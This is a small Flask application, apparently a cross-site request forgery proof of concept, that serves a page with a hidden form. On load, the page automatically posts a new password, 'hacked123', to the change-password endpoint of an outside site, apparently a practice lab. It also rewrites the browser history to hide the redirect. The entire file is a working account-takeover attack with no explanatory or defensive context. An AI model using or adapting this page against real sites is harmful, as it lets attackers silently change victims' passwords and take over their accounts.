from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    html_content = '''
    <html>
      <body>
        <form action="https://ouath-sso-open-redirect.onrender.com/change-password" method="POST">
          <input type="hidden" name="newPassword" value="hacked123" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
        </script>
      </body>
    </html>
    '''
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(port=4000)